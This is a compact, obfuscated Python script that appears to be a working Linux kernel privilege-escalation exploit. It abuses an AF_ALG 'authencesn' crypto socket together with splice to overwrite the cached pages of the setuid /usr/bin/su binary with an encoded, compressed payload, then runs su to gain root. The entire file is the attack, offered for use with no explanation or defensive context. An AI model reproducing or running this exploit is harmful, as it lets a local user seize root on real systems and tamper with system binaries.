from os import *
import zlib,socket as s
from base64 import b85decode as q
def c(f,t,c):
	a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha1),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,q('2mk>90000G'+'0'*40));v(h,5,None,4);u,_=a.accept();o=t+4;i=b'\0';u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\20'+i*19),(h,4,b'\10'+i*3),],1<<15);r,w=pipe();n=splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
	try:u.recv(8+t)
	except:0
f=open("/usr/bin/su",0);i=0;e=zlib.decompress(q("c-pIX^>JfjWMqH=CI&kO5U+y40nB$`zyuBq77Q>QAet3T7MY$0<-uqM0SIMy!0`WuOnz36UR!<;_gj{A#7urx!~a<}5&W$BNtt>2#Tg6?3;;625Yq"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
system("su")